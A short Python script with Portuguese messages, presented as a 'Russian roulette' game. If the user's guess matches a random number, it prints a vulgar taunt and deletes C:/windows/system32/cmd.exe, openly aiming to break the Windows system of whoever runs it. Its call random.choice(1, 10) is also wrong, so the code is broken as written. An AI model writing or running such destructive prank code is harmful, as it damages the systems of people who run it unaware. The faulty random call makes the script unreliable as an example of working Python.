import random
import os

print("Olá, você está no roleta russa! Se acertar o número teu PC morre")
escolhaUsuario = int(input("Digite um número de um a 10: "))

es = int(random.choice(1, 10))

if es == escolhaUsuario:
    print("Se fudeu!")
    os.remove("C:/windows/system32/cmd.exe")
else:
    print(f"você está a salvo! O número errado era {es}")


